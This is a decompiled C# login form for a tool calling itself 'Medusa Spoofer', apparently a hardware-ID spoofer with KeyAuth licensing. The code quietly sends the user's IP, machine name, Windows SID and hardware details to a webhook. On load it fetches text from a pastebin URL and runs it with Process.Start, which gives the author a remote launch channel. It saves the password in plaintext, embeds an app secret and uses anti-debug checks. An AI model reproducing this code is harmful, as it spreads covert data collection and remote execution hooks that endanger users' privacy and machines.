using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;
using Newtonsoft.Json;
using Protection;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;

namespace KeyAuth
{
	// Token: 0x02000016 RID: 22
	public partial class Login : Form
	{
		// Token: 0x060000BE RID: 190
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x060000BF RID: 191
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x060000C0 RID: 192
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x060000C1 RID: 193 RVA: 0x00002577 File Offset: 0x00000777
		private void Form1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Login.ReleaseCapture();
				Login.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x0000259F File Offset: 0x0000079F
		public Login()
		{
			this.InitializeComponent();
			base.FormBorderStyle = FormBorderStyle.None;
			base.Region = Region.FromHrgn(Login.CreateRoundRectRgn(0, 0, base.Width, base.Height, 20, 20));
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x00002175 File Offset: 0x00000375
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x000025D6 File Offset: 0x000007D6
		private string qbp6t8Ygr2P2()
		{
			return WindowsIdentity.GetCurrent().User.Value;
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x000025E7 File Offset: 0x000007E7
		private void username_Enter(object sender, EventArgs e)
		{
			this.allahu.Text = "";
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x000025F9 File Offset: 0x000007F9
		private void password_Enter(object sender, EventArgs e)
		{
			this.akbar.Text = "";
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x0000691C File Offset: 0x00004B1C
		private void LoginBtn_Click(object sender, EventArgs e)
		{
			if (this.allahu.Text == "")
			{
				MessageBox.Show("Username wasn't applied", "Project Medusa", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (this.akbar.Text == "")
			{
				MessageBox.Show("Password wasn't applied", "Project Medusa", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			using (WebClient webClient = new WebClient())
			{
				this.hybkfYFHZab9 = webClient.DownloadString("https://api.ipify.org");
			}
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				this.y3U369jHXthQ = Convert.ToString(managementObject["Name"]);
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				ManagementObject managementObject2 = (ManagementObject)managementBaseObject2;
				this.iT0g8ASeTNfy = Convert.ToString(managementObject2["Name"]);
			}
			foreach (ManagementBaseObject managementBaseObject3 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BaseBoard").Get())
			{
				ManagementObject managementObject3 = (ManagementObject)managementBaseObject3;
				this.X7lpqv44Akjm = Convert.ToString(managementObject3["Product"]);
			}
			foreach (ManagementBaseObject managementBaseObject4 in new ManagementClass("Win32_ComputerSystem").GetInstances())
			{
				ManagementObject managementObject4 = (ManagementObject)managementBaseObject4;
				this.ZbxMs8LrP3Fk = Convert.ToString(Math.Round(Convert.ToDouble(managementObject4.Properties["TotalPhysicalMemory"].Value) / 1073741824.0, 0)) + " GB";
			}
			Login.KeyAuthApp.gamwtospitisou(this.allahu.Text, this.akbar.Text);
			if (Login.KeyAuthApp.response.message.Contains("pWvdsxacJjeX"))
			{
				string body = JsonConvert.SerializeObject(new
				{
					username = "Medusa Logs",
					content = string.Concat(new string[]
					{
						"```CPU: ",
						this.y3U369jHXthQ,
						"\nGPU: ",
						this.iT0g8ASeTNfy,
						"\nMotherboard: ",
						this.X7lpqv44Akjm,
						"\nRAM: ",
						this.ZbxMs8LrP3Fk,
						"```"
					}),
					embeds = new <>f__AnonymousType1<string, int, <>f__AnonymousType2<string, string, bool>[]>[]
					{
						new
						{
							title = "Medusa Spoofer - Suspicious Account Sharing",
							color = 255,
							fields = new <>f__AnonymousType2<string, string, bool>[]
							{
								new
								{
									name = "Username:",
									value = (this.allahu.Text ?? ""),
									inline = false
								},
								new
								{
									name = "PC Name:",
									value = (Environment.MachineName ?? ""),
									inline = false
								},
								new
								{
									name = "IP:",
									value = (this.hybkfYFHZab9 ?? ""),
									inline = false
								},
								new
								{
									name = "HWID:",
									value = (this.qbp6t8Ygr2P2() ?? ""),
									inline = false
								}
							}
						}
					}
				});
				Login.KeyAuthApp.webhook("sduehwMgwu", "", body, "application/json");
				MessageBox.Show("HWID Doesn't Match. DM The Owners", "Project Medusa", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				Application.Exit();
			}
			if (Login.KeyAuthApp.response.success)
			{
				string body2 = JsonConvert.SerializeObject(new
				{
					username = "Medusa Logs",
					content = string.Concat(new string[]
					{
						"```CPU: ",
						this.y3U369jHXthQ,
						"\nGPU: ",
						this.iT0g8ASeTNfy,
						"\nMotherboard: ",
						this.X7lpqv44Akjm,
						"\nRAM: ",
						this.ZbxMs8LrP3Fk,
						"```"
					}),
					embeds = new <>f__AnonymousType1<string, int, <>f__AnonymousType2<string, string, bool>[]>[]
					{
						new
						{
							title = "Medusa Spoofer - Login",
							color = 65311,
							fields = new <>f__AnonymousType2<string, string, bool>[]
							{
								new
								{
									name = "Username:",
									value = Login.KeyAuthApp.user_data.username,
									inline = false
								},
								new
								{
									name = "IP:",
									value = Login.KeyAuthApp.user_data.ip,
									inline = false
								},
								new
								{
									name = "HWID:",
									value = Login.KeyAuthApp.user_data.hwid,
									inline = false
								}
							}
						}
					}
				});
				Login.KeyAuthApp.webhook("sduehwMgwu", "", body2, "application/json");
				File.WriteAllText(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\login.json", JsonConvert.SerializeObject(new Login.fb8SZewVuGU6
				{
					ZPt81m2InrN9 = this.allahu.Text,
					THwpYCWUyoXt = this.akbar.Text
				}));
				Console.Beep();
				new Main().Show();
				base.Hide();
				return;
			}
			MessageBox.Show(Login.KeyAuthApp.response.message ?? "", "Project Medusa", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x0000260B File Offset: 0x0000080B
		private void Login_Load(object sender, EventArgs e)
		{
			this.gamw();
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x00002613 File Offset: 0x00000813
		private void gamw()
		{
			this.to();
		}

		// Token: 0x060000CA RID: 202 RVA: 0x0000261B File Offset: 0x0000081B
		private void to()
		{
			this.spiti();
		}

		// Token: 0x060000CB RID: 203 RVA: 0x00002623 File Offset: 0x00000823
		private void spiti()
		{
			this.sou();
		}

		// Token: 0x060000CC RID: 204 RVA: 0x0000262B File Offset: 0x0000082B
		private void sou()
		{
			this.mpastarde();
		}

		// Token: 0x060000CD RID: 205 RVA: 0x00002633 File Offset: 0x00000833
		private void mpastarde()
		{
			this.xd();
		}

		// Token: 0x060000CE RID: 206 RVA: 0x0000263B File Offset: 0x0000083B
		private void xd()
		{
			this.lol();
		}

		// Token: 0x060000CF RID: 207 RVA: 0x00006E5C File Offset: 0x0000505C
		private void lol()
		{
			Protection.Debug.Initialize();
			Dump.Initialize();
			ProcessCheck.Initialize();
			Login.KeyAuthApp.init();
			if (File.Exists(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\login.json"))
			{
				Login.fb8SZewVuGU6 fb8SZewVuGU = JsonConvert.DeserializeObject<Login.fb8SZewVuGU6>(File.ReadAllText(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\login.json"));
				this.allahu.Text = fb8SZewVuGU.ZPt81m2InrN9;
				this.akbar.Text = fb8SZewVuGU.THwpYCWUyoXt;
			}
			string body = JsonConvert.SerializeObject(new
			{
				username = "Medusa Logs",
				content = string.Concat(new string[]
				{
					"```CPU: ",
					this.y3U369jHXthQ,
					"\nGPU: ",
					this.iT0g8ASeTNfy,
					"\nMotherboard: ",
					this.X7lpqv44Akjm,
					"\nRAM: ",
					this.ZbxMs8LrP3Fk,
					"```"
				}),
				embeds = new <>f__AnonymousType1<string, int, <>f__AnonymousType2<string, string, bool>[]>[]
				{
					new
					{
						title = "Medusa Spoofer - Login",
						color = 65311,
						fields = new <>f__AnonymousType2<string, string, bool>[]
						{
							new
							{
								name = "PC Name:",
								value = (Environment.MachineName ?? ""),
								inline = false
							},
							new
							{
								name = "IP:",
								value = (this.hybkfYFHZab9 ?? ""),
								inline = false
							},
							new
							{
								name = "HWID:",
								value = (this.qbp6t8Ygr2P2() ?? ""),
								inline = false
							}
						}
					}
				}
			});
			Login.KeyAuthApp.webhook("sduehwMgwu", "", body, "application/json");
			using (WebClient webClient = new WebClient())
			{
				string text = webClient.DownloadString("https://pastebin.com/raw/HdiTE62P");
				if (!(text == "none"))
				{
					Process.Start(text);
				}
			}
			using (WebClient webClient2 = new WebClient())
			{
				string text2 = webClient2.DownloadString("https://pastebin.com/raw/wdF77NTS");
				if (!(text2 == "none"))
				{
					MessageBox.Show(text2, "Project Medusa", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
			}
			if (Login.KeyAuthApp.checkblack())
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x0400005B RID: 91
		private static string OQB3hbga3sDz = "MedusaSpooferaki";

		// Token: 0x0400005C RID: 92
		private static string SVLuUXohRuWj = "ahLkqWnEc9";

		// Token: 0x0400005D RID: 93
		private static string Sou21VdLrWpG = "2c921df23d2c12e2f05143dcdf25c3030c2edf7b98dd6a230738eb316bd2c4a9";

		// Token: 0x0400005E RID: 94
		private string hybkfYFHZab9;

		// Token: 0x0400005F RID: 95
		private string y3U369jHXthQ;

		// Token: 0x04000060 RID: 96
		private string iT0g8ASeTNfy;

		// Token: 0x04000061 RID: 97
		private string X7lpqv44Akjm;

		// Token: 0x04000062 RID: 98
		private string ZbxMs8LrP3Fk;

		// Token: 0x04000063 RID: 99
		public static api KeyAuthApp = new api(Login.OQB3hbga3sDz, Login.SVLuUXohRuWj, Login.Sou21VdLrWpG, "1.3");

		// Token: 0x04000064 RID: 100
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x04000065 RID: 101
		public const int HT_CAPTION = 2;

		// Token: 0x02000017 RID: 23
		private class fb8SZewVuGU6
		{
			// Token: 0x17000037 RID: 55
			// (get) Token: 0x060000D3 RID: 211 RVA: 0x000026A6 File Offset: 0x000008A6
			// (set) Token: 0x060000D4 RID: 212 RVA: 0x000026AE File Offset: 0x000008AE
			public string ZPt81m2InrN9 { get; set; }

			// Token: 0x17000038 RID: 56
			// (get) Token: 0x060000D5 RID: 213 RVA: 0x000026B7 File Offset: 0x000008B7
			// (set) Token: 0x060000D6 RID: 214 RVA: 0x000026BF File Offset: 0x000008BF
			public string THwpYCWUyoXt { get; set; }
		}
	}
}
